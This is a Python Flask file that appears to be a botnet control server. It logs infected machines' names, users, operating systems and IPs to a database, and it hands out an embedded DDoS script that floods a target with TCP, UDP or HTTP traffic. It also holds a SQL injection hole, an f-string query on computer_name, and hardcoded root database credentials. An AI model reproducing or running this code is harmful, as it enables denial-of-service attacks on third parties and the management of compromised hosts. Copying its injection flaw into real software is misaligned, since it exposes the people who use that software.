import flask, pymysql

scrtipt = """
import socket, requests
import threading
import socket

method = "tcp"
target_ip = "192.168.0.1"  
target_port = 80  

def tcp():

    # Create a TCP socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        sock.connect((target_ip, target_port))
        print("Connected to the target")

        while True:
            # Send a TCP packet to the target
            sock.send(b"Hello, World!")

            response = sock.recv(1024)
            print("Received response:", response)

    except Exception as e:
        print("An error occurred:", str(e))

    finally:
        sock.close()

def ddos_udp():

    # Create a UDP socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    try:
        while True:
            # Send a UDP packet to the target
            sock.sendto(b"Hello, World!", (target_ip, target_port))

    except Exception as e:
        print("An error occurred:", str(e))

    finally:
        sock.close()

def ddos_http():
    while True:
        try:
            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0"
            }
            requests.get(f"{target_ip}", headers=headers)
        except Exception as e:
            print("An error occurred:", str(e))
    

if __name__ == "__main__":
    if method == "tcp":
        threading.Thread(target=tcp).start()
    elif method == "udp":
        threading.Thread(target=ddos_udp).start()
    elif method == "http":
        threading.Thread(target=ddos_http).start()
    else:
        print("Invalid method")"""

app = flask.Flask(__name__)
app.config["DEBUG"] = False

mydv = pymysql.connect(
    host="localhost",
    user="root",
    password="root",
    database="silence"

)

@app.route('/api', methods=['GET'])
def load_payload():
    if flask.request.method == 'GET':
        computer_name = flask.request.args.get('computer_name')
        username = flask.request.args.get('username')
        os = flask.request.args.get('os')
        host = flask.request.args.get('ip')
        
    
        cursor = mydv.cursor()
        cursor.execute(f"SELECT * FROM payload WHERE computer_name='{computer_name}'")
        result = cursor.fetchall()
        if result:
            sql = "UPDATE payload SET username=%s, os=%s, host=%s WHERE computer_name=%s"
            val = (username, os, host, computer_name)
            cursor.execute(sql, val)
            mydv.commit()
            return f"successfully"
        else:
            sql = "INSERT INTO payload (computer_name, username, os, host) VALUES (%s, %s, %s, %s)"
            val = (computer_name, username, os, host)
            cursor.execute(sql, val)
            mydv.commit()
            return f"successfully"

        


@app.route('/source')
def read_source():
    with open("files.py", "w") as f:
        f.write(scrtipt)


    with open("botnet.py", "r") as f:
        f = f.read()
        return f

app.run('localhost', 8080)